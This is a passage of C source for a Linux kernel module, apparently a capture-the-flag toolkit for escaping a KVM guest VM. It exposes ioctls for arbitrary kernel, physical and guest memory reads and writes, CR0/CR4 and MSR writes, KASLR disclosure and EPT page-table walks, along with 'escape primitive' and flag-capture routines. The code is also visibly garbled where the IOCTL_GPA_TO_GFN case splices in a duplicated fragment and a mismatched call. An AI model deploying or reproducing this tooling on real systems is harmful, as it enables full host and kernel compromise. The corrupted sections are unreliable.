        chunk_size = min(chunk_size, (size_t)(PAGE_SIZE - offset));

        mapped = ioremap(page_phys, PAGE_SIZE);
        if (!mapped) {
            return written > 0 ? 0 : -EFAULT;
        }

        memcpy_toio(mapped + offset, buffer + written, chunk_size);
        iounmap(mapped);

        written += chunk_size;
        remaining -= chunk_size;
    }

    return 0;
}

static int write_physical_via_pfn(unsigned long phys_addr, const unsigned char *buffer, size_t size)
{
    unsigned long pfn = phys_addr >> PAGE_SHIFT;
    unsigned long offset = phys_addr & ~PAGE_MASK;
    struct page *page;
    void *kaddr;
    size_t to_copy;
    size_t written = 0;

    while (written < size) {
        if (!pfn_valid(pfn)) {
            return written > 0 ? 0 : -EINVAL;
        }

        page = pfn_to_page(pfn);
        if (!page) {
            return written > 0 ? 0 : -EFAULT;
        }

        kaddr = kmap_atomic(page);
        if (!kaddr) {
            return written > 0 ? 0 : -ENOMEM;
        }

        to_copy = min(size - written, (size_t)(PAGE_SIZE - offset));
        memcpy(kaddr + offset, buffer + written, to_copy);
        kunmap_atomic(kaddr);

        written += to_copy;
        pfn++;
        offset = 0;
    }

    return 0;
}

/* ========================================================================
 * Address Conversion Functions
 * ======================================================================== */

static inline unsigned long gpa_to_gfn_local(unsigned long gpa)
{
    return gpa >> PAGE_SHIFT;
}

static inline unsigned long gfn_to_gpa_local(unsigned long gfn)
{
    return gfn << PAGE_SHIFT;
}

static int convert_virt_to_phys(unsigned long virt_addr, struct virt_to_phys_request *req)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;
    unsigned long phys;

    req->virt_addr = virt_addr;
    req->phys_addr = 0;
    req->pfn = 0;
    req->offset = virt_addr & ~PAGE_MASK;
    req->status = -EFAULT;

    if (!current->mm) {
        return -EINVAL;
    }

    pgd = pgd_offset(current->mm, virt_addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) {
        return -EFAULT;
    }

    p4d = p4d_offset(pgd, virt_addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) {
        return -EFAULT;
    }

    pud = pud_offset(p4d, virt_addr);
    if (pud_none(*pud)) {
        return -EFAULT;
    }
    
    if (pud_large(*pud)) {
        phys = (pud_pfn(*pud) << PAGE_SHIFT) | (virt_addr & ~PUD_MASK);
        req->phys_addr = phys;
        req->pfn = phys >> PAGE_SHIFT;
        req->status = 0;
        return 0;
    }

    pmd = pmd_offset(pud, virt_addr);
    if (pmd_none(*pmd)) {
        return -EFAULT;
    }

    if (pmd_large(*pmd)) {
        phys = (pmd_pfn(*pmd) << PAGE_SHIFT) | (virt_addr & ~PMD_MASK);
        req->phys_addr = phys;
        req->pfn = phys >> PAGE_SHIFT;
        req->status = 0;
        return 0;
    }

    pte = pte_offset_kernel(pmd, virt_addr);
    if (!pte || pte_none(*pte)) {
        return -EFAULT;
    }

    phys = (pte_pfn(*pte) << PAGE_SHIFT) | req->offset;
    req->phys_addr = phys;
    req->pfn = pte_pfn(*pte);
    req->status = 0;

    return 0;
}

static int convert_hva_to_pfn(unsigned long hva, unsigned long *pfn, int writable)
{
    struct page *page = NULL;
    int ret;
    unsigned int gup_flags = FOLL_GET;

    if (writable) {
        gup_flags |= FOLL_WRITE;
    }

    down_read(&current->mm->mmap_lock);
    ret = get_user_pages(hva, 1, gup_flags, &page, NULL);
    up_read(&current->mm->mmap_lock);

    if (ret < 0 || !page) {
        return ret < 0 ? ret : -EFAULT;
    }

    *pfn = page_to_pfn(page);
    put_page(page);

    return 0;
}

static int convert_pfn_to_hva(unsigned long pfn, unsigned long *hva)
{
    if (!pfn_valid(pfn)) {
        return -EINVAL;
    }

    *hva = (unsigned long)pfn_to_kaddr(pfn);
    return 0;
}

static int convert_virt_to_pfn(unsigned long virt_addr, unsigned long *pfn)
{
    struct virt_to_phys_request req;
    int ret;

    ret = convert_virt_to_phys(virt_addr, &req);
    if (ret == 0) {
        *pfn = req.pfn;
    }
    return ret;
}

/* SPTE decoding */
static void spte_to_pfn_local(unsigned long spte, struct spte_to_pfn_request *req)
{
    req->spte = spte;
    req->flags = spte & 0xFFF;
    req->present = (spte & 0x1) ? 1 : 0;
    req->writable = (spte & 0x2) ? 1 : 0;
    req->executable = (spte & 0x4) ? 1 : 0;  /* NX bit inverted for EPT */
    
    /* Extract PFN from bits 51:12 */
    req->pfn = (spte & 0x000FFFFFFFFFF000ULL) >> PAGE_SHIFT;
    req->status = 0;
}

/* ========================================================================
 * Page Table Operations
 * ======================================================================== */

static int dump_page_tables(unsigned long virt_addr, struct page_table_dump *dump)
{
    pgd_t *pgd;
    p4d_t *p4d;
    pud_t *pud;
    pmd_t *pmd;
    pte_t *pte;

    dump->virtual_addr = virt_addr;
    dump->pml4e = 0;
    dump->pdpte = 0;
    dump->pde = 0;
    dump->pte = 0;
    dump->physical_addr = 0;
    dump->status = -EFAULT;

    if (!current->mm) {
        return -EINVAL;
    }

    pgd = pgd_offset(current->mm, virt_addr);
    dump->pml4e = pgd_val(*pgd);
    if (pgd_none(*pgd)) {
        return 0;
    }

    p4d = p4d_offset(pgd, virt_addr);
    if (p4d_none(*p4d)) {
        return 0;
    }

    pud = pud_offset(p4d, virt_addr);
    dump->pdpte = pud_val(*pud);
    if (pud_none(*pud)) {
        return 0;
    }

    if (pud_large(*pud)) {
        dump->physical_addr = (pud_pfn(*pud) << PAGE_SHIFT) | (virt_addr & ~PUD_MASK);
        dump->status = 0;
        return 0;
    }

    pmd = pmd_offset(pud, virt_addr);
    dump->pde = pmd_val(*pmd);
    if (pmd_none(*pmd)) {
        return 0;
    }

    if (pmd_large(*pmd)) {
        dump->physical_addr = (pmd_pfn(*pmd) << PAGE_SHIFT) | (virt_addr & ~PMD_MASK);
        dump->status = 0;
        return 0;
    }

    pte = pte_offset_kernel(pmd, virt_addr);
    if (pte) {
        dump->pte = pte_val(*pte);
        if (!pte_none(*pte)) {
            dump->physical_addr = (pte_pfn(*pte) << PAGE_SHIFT) | (virt_addr & ~PAGE_MASK);
            dump->status = 0;
        }
    }

    return 0;
}

/* Walk EPT tables */
static int walk_ept_tables(unsigned long eptp, unsigned long gpa, struct ept_walk_request *req)
{
    void __iomem *mapped;
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long phys;
    int pml4_idx, pdpt_idx, pd_idx, pt_idx;

    req->eptp = eptp;
    req->gpa = gpa;
    req->hpa = 0;
    req->pml4e = 0;
    req->pdpte = 0;
    req->pde = 0;
    req->pte = 0;
    req->page_size = 0;
    req->status = -EFAULT;

    /* Extract indices */
    pml4_idx = (gpa >> 39) & 0x1FF;
    pdpt_idx = (gpa >> 30) & 0x1FF;
    pd_idx = (gpa >> 21) & 0x1FF;
    pt_idx = (gpa >> 12) & 0x1FF;

    /* Get PML4 base from EPTP (bits 51:12) */
    pml4_base = eptp & 0x000FFFFFFFFFF000ULL;

    /* Read PML4 entry */
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pml4e, mapped, 8);
    iounmap(mapped);
    req->pml4e = pml4e;

    if (!(pml4e & 0x1)) {
        return -ENOENT;
    }

    /* Get PDPT base */
    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;

    /* Read PDPT entry */
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pdpte, mapped, 8);
    iounmap(mapped);
    req->pdpte = pdpte;

    if (!(pdpte & 0x1)) {
        return -ENOENT;
    }

    /* Check for 1GB page (bit 7) */
    if (pdpte & 0x80) {
        phys = (pdpte & 0x000FFFFFC0000000ULL) | (gpa & 0x3FFFFFFF);
        req->hpa = phys;
        req->page_size = 1024 * 1024 * 1024;  /* 1GB */
        req->status = 0;
        return 0;
    }

    /* Get PD base */
    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;

    /* Read PD entry */
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pde, mapped, 8);
    iounmap(mapped);
    req->pde = pde;

    if (!(pde & 0x1)) {
        return -ENOENT;
    }

    /* Check for 2MB page (bit 7) */
    if (pde & 0x80) {
        phys = (pde & 0x000FFFFFFFE00000ULL) | (gpa & 0x1FFFFF);
        req->hpa = phys;
        req->page_size = 2 * 1024 * 1024;  /* 2MB */
        req->status = 0;
        return 0;
    }

    /* Get PT base */
    pt_base = pde & 0x000FFFFFFFFFF000ULL;

    /* Read PT entry */
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pte, mapped, 8);
    iounmap(mapped);
    req->pte = pte;

    if (!(pte & 0x1)) {
        return -ENOENT;
    }

    /* 4KB page */
    phys = (pte & 0x000FFFFFFFFFF000ULL) | (gpa & 0xFFF);
    req->hpa = phys;
    req->page_size = 4096;  /* 4KB */
    req->status = 0;

    return 0;
}

/* Translate GVA to GPA */
static int translate_gva_to_gpa(unsigned long gva, unsigned long cr3, struct gva_translate_request *req)
{
    void __iomem *mapped;
    unsigned long pml4_base, pdpt_base, pd_base, pt_base;
    unsigned long pml4e, pdpte, pde, pte;
    unsigned long phys;
    int pml4_idx, pdpt_idx, pd_idx, pt_idx;

    req->gva = gva;
    req->gpa = 0;
    req->hva = 0;
    req->hpa = 0;
    req->cr3 = cr3;
    req->status = -EFAULT;

    /* Extract indices */
    pml4_idx = (gva >> 39) & 0x1FF;
    pdpt_idx = (gva >> 30) & 0x1FF;
    pd_idx = (gva >> 21) & 0x1FF;
    pt_idx = (gva >> 12) & 0x1FF;

    /* Get PML4 base from CR3 */
    pml4_base = cr3 & 0x000FFFFFFFFFF000ULL;

    /* Read PML4 entry */
    mapped = ioremap(pml4_base + pml4_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pml4e, mapped, 8);
    iounmap(mapped);

    if (!(pml4e & 0x1)) {
        return -ENOENT;
    }

    /* Get PDPT base */
    pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;

    /* Read PDPT entry */
    mapped = ioremap(pdpt_base + pdpt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pdpte, mapped, 8);
    iounmap(mapped);

    if (!(pdpte & 0x1)) {
        return -ENOENT;
    }

    /* Check for 1GB page */
    if (pdpte & 0x80) {
        phys = (pdpte & 0x000FFFFFC0000000ULL) | (gva & 0x3FFFFFFF);
        req->gpa = phys;
        req->status = 0;
        return 0;
    }

    /* Get PD base */
    pd_base = pdpte & 0x000FFFFFFFFFF000ULL;

    /* Read PD entry */
    mapped = ioremap(pd_base + pd_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pde, mapped, 8);
    iounmap(mapped);

    if (!(pde & 0x1)) {
        return -ENOENT;
    }

    /* Check for 2MB page */
    if (pde & 0x80) {
        phys = (pde & 0x000FFFFFFFE00000ULL) | (gva & 0x1FFFFF);
        req->gpa = phys;
        req->status = 0;
        return 0;
    }

    /* Get PT base */
    pt_base = pde & 0x000FFFFFFFFFF000ULL;

    /* Read PT entry */
    mapped = ioremap(pt_base + pt_idx * 8, 8);
    if (!mapped) return -EFAULT;
    memcpy_fromio(&pte, mapped, 8);
    iounmap(mapped);

    if (!(pte & 0x1)) {
        return -ENOENT;
    }

    /* 4KB page */
    phys = (pte & 0x000FFFFFFFFFF000ULL) | (gva & 0xFFF);
    req->gpa = phys;
    req->status = 0;

    return 0;
}

/* ========================================================================
 * Pattern Search Functions
 * ======================================================================== */

static int find_pattern_in_range(unsigned long start, unsigned long end,
                                  const unsigned char *pattern, size_t pattern_len,
                                  unsigned long *found_addr, int region_type)
{
    unsigned char *buffer;
    size_t chunk_size = PAGE_SIZE;
    unsigned long addr;

    buffer = kmalloc(chunk_size, GFP_KERNEL);
    if (!buffer) {
        return -ENOMEM;
    }

    for (addr = start; addr < end - pattern_len; addr += chunk_size - pattern_len) {
        int ret;
        size_t search_len = min(chunk_size, (size_t)(end - addr));

        if (region_type == 0) {
            ret = read_physical_memory(addr, buffer, search_len);
        } else {
            ret = read_kernel_memory(addr, buffer, search_len);
        }

        if (ret < 0) {
            continue;
        }

        /* Search for pattern */
        for (size_t i = 0; i < search_len - pattern_len; i++) {
            if (memcmp(buffer + i, pattern, pattern_len) == 0) {
                *found_addr = addr + i;
                kfree(buffer);
                return 0;
            }
        }
    }

    kfree(buffer);
    return -ENOENT;
}

/* ========================================================================
 * Guest Memory Operations
 * ======================================================================== */

static int read_guest_memory_gpa(unsigned long gpa, unsigned char *buffer, size_t size)
{
    printk(KERN_INFO "%s: Reading guest GPA 0x%lx (size: %zu)\n",
           DRIVER_NAME, gpa, size);
    return read_physical_memory(gpa, buffer, size);
}

static int write_guest_memory_gpa(unsigned long gpa, const unsigned char *buffer, size_t size)
{
    printk(KERN_INFO "%s: Writing to guest GPA 0x%lx (size: %zu)\n",
           DRIVER_NAME, gpa, size);
    return write_physical_memory(gpa, buffer, size);
}

/* ========================================================================
 * KVM Structure Discovery
 * ======================================================================== */

static int find_kvm_structures(struct kvm_vm_info *info)
{
    unsigned long kvm_addr;
    
    /* Try to find KVM via exported symbols */
    kvm_addr = lookup_kernel_symbol("kvm_get_running_vcpu");
    if (kvm_addr) {
        info->kvm_base = kvm_addr;
    }

    /* Look for vmx/svm structures */
    info->vcpu_base = lookup_kernel_symbol("vmx_vcpu_run");
    if (!info->vcpu_base) {
        info->vcpu_base = lookup_kernel_symbol("svm_vcpu_run");
    }

    info->status = 0;
    return 0;
}

/* ========================================================================
 * Escape Primitives
 * ======================================================================== */

static int prepare_escape(struct escape_state *state)
{
    state->stage = 1;
    state->host_cr3 = read_cr3_local();
    
#ifdef CONFIG_X86
    /* Read host state */
    state->host_rip = 0;  /* Would need VMCS access */
    state->host_rsp = 0;  /* Would need VMCS access */
#endif

    state->status = 0;
    printk(KERN_INFO "%s: Escape prepared, host CR3: 0x%lx\n", 
           DRIVER_NAME, state->host_cr3);
    
    return 0;
}

static int capture_flag(struct flag_capture_request *req)
{
    struct file *file;
    loff_t pos = 0;
    ssize_t bytes_read;
    mm_segment_t old_fs;

    req->status = -EFAULT;

    /* Method 1: Direct file read from kernel */
    if (req->capture_method == 0) {
        file = filp_open(req->flag_path, O_RDONLY, 0);
        if (IS_ERR(file)) {
            printk(KERN_WARNING "%s: Failed to open flag file: %s\n", 
                   DRIVER_NAME, req->flag_path);
            return PTR_ERR(file);
        }

        old_fs = get_fs();
        set_fs(KERNEL_DS);
        bytes_read = kernel_read(file, req->flag_data, sizeof(req->flag_data) - 1, &pos);
        set_fs(old_fs);

        filp_close(file, NULL);

        if (bytes_read > 0) {
            req->flag_data[bytes_read] = '\0';
            req->status = 0;
            printk(KERN_INFO "%s: Flag captured: %s\n", DRIVER_NAME, req->flag_data);
            return 0;
        }
    }

    /* Method 2: Memory scan for flag pattern */
    if (req->capture_method == 1 && req->flag_addr) {
        if (read_kernel_memory(req->flag_addr, (unsigned char *)req->flag_data, 
                               sizeof(req->flag_data) - 1) == 0) {
            req->flag_data[sizeof(req->flag_data) - 1] = '\0';
            req->status = 0;
            return 0;
        }
    }

    /* Method 3: Physical memory read */
    if (req->capture_method == 2 && req->flag_addr) {
        if (read_physical_memory(req->flag_addr, (unsigned char *)req->flag_data,
                                 sizeof(req->flag_data) - 1) == 0) {
            req->flag_data[sizeof(req->flag_data) - 1] = '\0';
            req->status = 0;
            return 0;
        }
    }

    return req->status;
}

/* ========================================================================
 * IOCTL Handler
 * ======================================================================== */

static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    int i, count;

    switch (cmd) {
        /* ================================================================
         * Step 1: Symbol Operations
         * ================================================================ */

        case IOCTL_LOOKUP_SYMBOL: {
            struct symbol_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            req.address = lookup_kernel_symbol(req.name);
            req.description[0] = '\0';

            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (strcmp(kvm_symbols[i].name, req.name) == 0) {
                    strncpy(req.description, kvm_symbols[i].description,
                           sizeof(req.description) - 1);
                    break;
                }
            }

            if (copy_to_user((void __user *)arg, &req, sizeof(req))) {
                return -EFAULT;
            }

            return req.address ? 0 : -ENOENT;
        }

        case IOCTL_GET_SYMBOL_COUNT: {
            return copy_to_user((void __user *)arg, &kvm_symbol_count,
                               sizeof(kvm_symbol_count)) ? -EFAULT : 0;
        }

        case IOCTL_GET_SYMBOL_BY_INDEX: {
            unsigned int index;
            struct symbol_request req;

            if (copy_from_user(&index, (void __user *)arg, sizeof(index))) {
                return -EFAULT;
            }

            if (index >= kvm_symbol_count) {
                return -EINVAL;
            }

            count = 0;
            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address) {
                    if (count == index) {
                        break;
                    }
                    count++;
                }
            }

            if (kvm_symbols[i].name == NULL) {
                return -EINVAL;
            }

            strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
            req.name[MAX_SYMBOL_NAME - 1] = '\0';
            req.address = kvm_symbols[i].address;
            strncpy(req.description, kvm_symbols[i].description,
                   sizeof(req.description) - 1);
            req.description[sizeof(req.description) - 1] = '\0';

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }

        case IOCTL_FIND_SYMBOL_BY_NAME: {
            struct symbol_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.name[MAX_SYMBOL_NAME - 1] = '\0';

            for (i = 0; kvm_symbols[i].name != NULL; i++) {
                if (kvm_symbols[i].address && strstr(kvm_symbols[i].name, req.name)) {
                    strncpy(req.name, kvm_symbols[i].name, MAX_SYMBOL_NAME - 1);
                    req.name[MAX_SYMBOL_NAME - 1] = '\0';
                    req.address = kvm_symbols[i].address;
                    strncpy(req.description, kvm_symbols[i].description,
                           sizeof(req.description) - 1);
                    req.description[sizeof(req.description) - 1] = '\0';

                    return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
                }
            }

            return -ENOENT;
        }

        case IOCTL_GET_VMX_HANDLERS: {
            count = 0;
            for (i = 0; vmx_handlers[i].name != NULL; i++) {
                if (vmx_handlers[i].address) count++;
            }
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_GET_SVM_HANDLERS: {
            count = 0;
            for (i = 0; svm_handlers[i].name != NULL; i++) {
                if (svm_handlers[i].address) count++;
            }
            return copy_to_user((void __user *)arg, &count, sizeof(count)) ? -EFAULT : 0;
        }

        case IOCTL_SEARCH_SYMBOLS: {
            char pattern[MAX_SYMBOL_NAME];
            struct symbol_request results[16];
            int result_count = 0;

            if (copy_from_user(pattern, (void __user *)arg, sizeof(pattern))) {
                return -EFAULT;
            }
            pattern[MAX_SYMBOL_NAME - 1] = '\0';

            for (i = 0; kvm_symbols[i].name != NULL && result_count < 16; i++) {
                if (kvm_symbols[i].address && strstr(kvm_symbols[i].name, pattern)) {
                    strncpy(results[result_count].name, kvm_symbols[i].name,
                           MAX_SYMBOL_NAME - 1);
                    results[result_count].name[MAX_SYMBOL_NAME - 1] = '\0';
                    results[result_count].address = kvm_symbols[i].address;
                    strncpy(results[result_count].description,
                           kvm_symbols[i].description, 255);
                    results[result_count].description[255] = '\0';
                    result_count++;
                }
            }

            for (i = 0; vmx_handlers[i].name != NULL && result_count < 16; i++) {
                if (vmx_handlers[i].address && strstr(vmx_handlers[i].name, pattern)) {
                    strncpy(results[result_count].name, vmx_handlers[i].name,
                           MAX_SYMBOL_NAME - 1);
                    results[result_count].name[MAX_SYMBOL_NAME - 1] = '\0';
                    results[result_count].address = vmx_handlers[i].address;
                    snprintf(results[result_count].description, 256, "VMX exit handler");
                    result_count++;
                }
            }

            for (i = 0; svm_handlers[i].name != NULL && result_count < 16; i++) {
                if (svm_handlers[i].address && strstr(svm_handlers[i].name, pattern)) {
                    strncpy(results[result_count].name, svm_handlers[i].name,
                           MAX_SYMBOL_NAME - 1);
                    results[result_count].name[MAX_SYMBOL_NAME - 1] = '\0';
                    results[result_count].address = svm_handlers[i].address;
                    snprintf(results[result_count].description, 256, "SVM exit handler");
                    result_count++;
                }
            }

            return result_count;
        }

        /* ================================================================
         * Step 2: Memory Read Operations
         * ================================================================ */

        case IOCTL_READ_KERNEL_MEM: {
            struct kernel_mem_read req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > MAX_READ_SIZE) {
                return -EINVAL;
            }

            kbuf = vmalloc(req.length);
            if (!kbuf) {
                return -ENOMEM;
            }

            ret = read_kernel_memory(req.kernel_addr, kbuf, req.length);
            if (ret == 0) {
                if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                    ret = -EFAULT;
                }
            }

            vfree(kbuf);
            return ret;
        }

        case IOCTL_READ_PHYSICAL_MEM: {
            struct physical_mem_read req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > MAX_READ_SIZE) {
                return -EINVAL;
            }

            kbuf = vmalloc(req.length);
            if (!kbuf) {
                return -ENOMEM;
            }

            ret = read_physical_memory(req.phys_addr, kbuf, req.length);
            if (ret == 0) {
                if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                    ret = -EFAULT;
                }
            }

            vfree(kbuf);
            return ret;
        }

        case IOCTL_READ_GUEST_MEM: {
            struct guest_mem_read req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > MAX_READ_SIZE) {
                return -EINVAL;
            }

            kbuf = vmalloc(req.length);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (req.mode == 0) {
                ret = read_guest_memory_gpa(req.gpa, kbuf, req.length);
            } else if (req.mode == 2) {
                ret = read_guest_memory_gpa(req.gpa << PAGE_SHIFT, kbuf, req.length);
            } else {
                ret = -EINVAL;
            }

            if (ret == 0) {
                if (copy_to_user(req.user_buffer, kbuf, req.length)) {
                    ret = -EFAULT;
                }
            }

            vfree(kbuf);
            return ret;
        }

#ifdef CONFIG_X86
        case IOCTL_READ_CR_REGISTER: {
            struct {
                int cr_num;
                unsigned long value;
            } cr_req;

            if (copy_from_user(&cr_req, (void __user *)arg, sizeof(cr_req))) {
                return -EFAULT;
            }

            switch (cr_req.cr_num) {
                case 0: cr_req.value = read_cr0_local(); break;
                case 2: cr_req.value = read_cr2_local(); break;
                case 3: cr_req.value = read_cr3_local(); break;
                case 4: cr_req.value = read_cr4_local(); break;
                default: return -EINVAL;
            }

            return copy_to_user((void __user *)arg, &cr_req, sizeof(cr_req)) ? -EFAULT : 0;
        }

        case IOCTL_READ_MSR: {
            struct msr_read_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.value = read_msr_safe(req.msr);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : 0;
        }
#endif

        case IOCTL_DUMP_PAGE_TABLES: {
            struct page_table_dump dump;

            if (copy_from_user(&dump, (void __user *)arg, sizeof(dump))) {
                return -EFAULT;
            }

            dump_page_tables(dump.virtual_addr, &dump);

            return copy_to_user((void __user *)arg, &dump, sizeof(dump)) ? -EFAULT : dump.status;
        }

        case IOCTL_GET_KASLR_INFO: {
            struct kaslr_info info = {0};

            info.kernel_base = g_kernel_text_base;
            info.kaslr_slide = g_kaslr_slide;
            info.physmap_base = lookup_kernel_symbol("page_offset_base");
            info.vmalloc_base = lookup_kernel_symbol("vmalloc_base");
            info.vmemmap_base = lookup_kernel_symbol("vmemmap_base");

            return copy_to_user((void __user *)arg, &info, sizeof(info)) ? -EFAULT : 0;
        }

        /* ================================================================
         * Step 3: Memory Write Operations
         * ================================================================ */

        case IOCTL_WRITE_KERNEL_MEM: {
            struct kernel_mem_write req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.kernel_addr || !req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > MAX_WRITE_SIZE) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }

            ret = write_kernel_memory(req.kernel_addr, kbuf, req.length, req.disable_wp);
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_PHYSICAL_MEM: {
            struct physical_mem_write req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > MAX_WRITE_SIZE) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }

            if (req.use_pfn) {
                ret = write_physical_via_pfn(req.phys_addr, kbuf, req.length);
            } else {
                ret = write_physical_memory(req.phys_addr, kbuf, req.length);
            }
            kfree(kbuf);
            return ret;
        }

        case IOCTL_WRITE_GUEST_MEM: {
            struct guest_mem_write req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!req.length || !req.user_buffer) {
                return -EINVAL;
            }

            if (req.length > MAX_WRITE_SIZE) {
                return -EINVAL;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            if (copy_from_user(kbuf, req.user_buffer, req.length)) {
                kfree(kbuf);
                return -EFAULT;
            }

            if (req.mode == 0) {
                ret = write_guest_memory_gpa(req.gpa, kbuf, req.length);
            } else if (req.mode == 2) {
                ret = write_guest_memory_gpa(req.gpa << PAGE_SHIFT, kbuf, req.length);
            } else {
                ret = -EINVAL;
            }

            kfree(kbuf);
            return ret;
        }

#ifdef CONFIG_X86
        case IOCTL_WRITE_MSR: {
            struct msr_write_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            return write_msr_safe_local(req.msr, req.value);
        }

        case IOCTL_WRITE_CR_REGISTER: {
            struct cr_write_request req;
            unsigned long current_val, new_val;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (req.mask == 0) {
                req.mask = ~0UL;
            }

            switch (req.cr_num) {
                case 0:
                    current_val = read_cr0_local();
                    new_val = (current_val & ~req.mask) | (req.value & req.mask);
                    write_cr0_local(new_val);
                    break;
                case 4:
                    current_val = read_cr4_local();
                    new_val = (current_val & ~req.mask) | (req.value & req.mask);
                    write_cr4_local(new_val);
                    break;
                default:
                    return -EINVAL;
            }
            return 0;
        }
#endif

        case IOCTL_MEMSET_KERNEL: {
            struct memset_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            if (!virt_addr_valid(req.addr)) {
                return -EFAULT;
            }

            memset((void *)req.addr, req.value, req.length);
            return 0;
        }

        case IOCTL_MEMSET_PHYSICAL: {
            struct memset_request req;
            unsigned char *kbuf;
            int ret;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            kbuf = kmalloc(req.length, GFP_KERNEL);
            if (!kbuf) {
                return -ENOMEM;
            }

            memset(kbuf, req.value, req.length);
            ret = write_physical_memory(req.addr, kbuf, req.length);
            kfree(kbuf);
            return ret;
        }

        /* ================================================================
         * Step 4: Address Conversion Operations
         * ================================================================ */

        case IOCTL_VIRT_TO_PHYS: {
            struct virt_to_phys_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            convert_virt_to_phys(req.virt_addr, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_HVA_TO_PFN: {
            struct hva_to_pfn_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.status = convert_hva_to_pfn(req.hva, &req.pfn, req.writable);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_PFN_TO_HVA: {
            struct addr_conv_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.status = convert_pfn_to_hva(req.input_addr, &req.output_addr);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_VIRT_TO_PFN: {
            struct addr_conv_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            req.status = convert_virt_to_pfn(req.input_addr, &req.output_addr);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_GPA_TO_GFN: {
            struct addr_conv_request req;

            if (copy_from_user(&req, (void __user *)arg, sizeof(req)))user *)arg, sizeof(req))) {
                return -EFAULT;
            }

            spte_to_pfn_local(req.spte, &req);

            return copy_to_user((void __user *)arg, &req, sizeof(req)) ? -EFAULT : req.status;
        }

        case IOCTL_WALK_EPT: {
            struct ept_walk_request req;

